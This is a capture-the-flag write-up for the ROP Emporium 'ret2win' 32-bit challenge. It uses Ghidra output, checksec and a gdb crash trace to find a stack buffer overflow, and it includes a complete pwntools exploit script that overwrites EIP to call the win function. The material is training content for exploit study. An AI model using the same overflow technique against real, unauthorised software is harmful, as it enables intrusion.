## Ret2win

### Challenge : ret2win means 'return here to win' and it's recommended you start with this challenge. Visit the challenge page by clicking the link above to learn more.
---

Challenge Description
```
These challenges use the usual CTF objective of retrieving the contents of a file named "flag.txt" from a remote machine by exploiting a given binary. The two most common courses of action are to somehow read flag.txt back to us directly or drop a shell and read it yourself. Let's see if ret2win has an easy way to do either of these. We'll use the following nm one-liner to check method names. nm ret2win|grep ' t ' will tell us that the suspiciously named function 'ret2win' is present and r2 confirms that it will cat the flag back to us

```
---
TLDR:

We overflow a stack, so that we can change EIP to call a required function to get the flag

---

So basically, to exploit the binary and get the flag, we need to call the ret2win function.

Decompiling the main function in ghidra, we get
```

undefined4 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("ret2win by ROP Emporium");
  puts("32bits\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```
There's a `pwnme` function, we need that too.
```

void pwnme(void)

{
  char local_2c [40];
  
  memset(local_2c,0,0x20);
  puts(
      "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stackbuffer;\nWhat could possibly go wrong?"
      );
  puts(
      "You there madam, may I have your input please? And don\'t worry about null bytes, we\'reusing fgets!\n"
      );
  printf("> ");
  fgets(local_2c,0x32,stdin);
  return;
}
```

There's a clear Buffer Overflow vulnerability.

Lets' check the security implementations of the binary
```
checksec ret2win32                                                    Sat 11 May 2019 01:21:54 IST
[*] '/ropemporium/ret2win/ret2win32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
With `NX Enabled` we can't execute a injected shellcode. So, we use ROP. 

Let's start with finding the offset to control EIP. 

Use pwntools to generate a cyclic string
```
python2                                                         Sat 11 May 2019 01:30:29 IST
Python 2.7.15+ (default, Oct  2 2018, 22:12:08) 
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(200)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
```

Use the generated string to cause the program to crash. 

```
gdb ./ret2win32 -q                                            732ms  Sat 11 May 2019 01:30:12 IST
[----------------------------------registers-----------------------------------]
EAX: 0xffffd540 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam")
EBX: 0x0 
ECX: 0xf7fa889c --> 0x0 
EDX: 0xffffd540 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam")
ESI: 0xf7fa7000 --> 0x1dcd6c 
EDI: 0xf7fa7000 --> 0x1dcd6c 
EBP: 0x6161616b ('kaaa')
ESP: 0xffffd570 --> 0xf7fe006d (or     BYTE PTR [ebp+0x3c8d490c],cl)
EIP: 0x6161616c ('laaa')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x6161616c
[------------------------------------stack-------------------------------------]
0000| 0xffffd570 --> 0xf7fe006d (or     BYTE PTR [ebp+0x3c8d490c],cl)
0004| 0xffffd574 --> 0xffffd590 --> 0x1 
0008| 0xffffd578 --> 0x0 
0012| 0xffffd57c --> 0xf7de4b41 (<__libc_start_main+241>:       add    esp,0x10)
0016| 0xffffd580 --> 0xf7fa7000 --> 0x1dcd6c 
0020| 0xffffd584 --> 0xf7fa7000 --> 0x1dcd6c 
0024| 0xffffd588 --> 0x0 
0028| 0xffffd58c --> 0xf7de4b41 (<__libc_start_main+241>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x6161616c in ?? ()
```

locate the crash location to find the offset

```
>>> cyclic_find(0x6161616c)
44
```

The offset is `44`.

Now for the exploit. I'll be using pwntools, to generate the exploit. We use pwntools, to find the location of the function, write it to the EIP and get the flag. 

```
from pwn import *

elf = context.binary = ELF('ret2win32')   #get the binary
info("TARGET : %#x", elf.symbols.ret2win) #print the location of ret2win

io = process(elf.path) #start the binary
ret2win = p32(elf.symbols.ret2win)
payload = "A"*44 + ret2win 
io.sendline(payload)
io.recvuntil("flag:")
flag = io.recvline()
success(flag)
```
`exploit.py`
```
python2 exploit.py                                            10.9m  Sat 11 May 2019 01:41:15 IST
[*] '/ropemporium/ret2win/ret2win32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] TARGET : 0x8048659
[+] Starting local process '/ropemporium/ret2win/ret2win32': pid 22757
[+] ROPE{a_placeholder_32byte_flag!}
[*] Stopped process '/ret2win/ret2win32' (pid 22757)
```
For reference, here's a picture of function call stack.

![Image](stackframe.gif)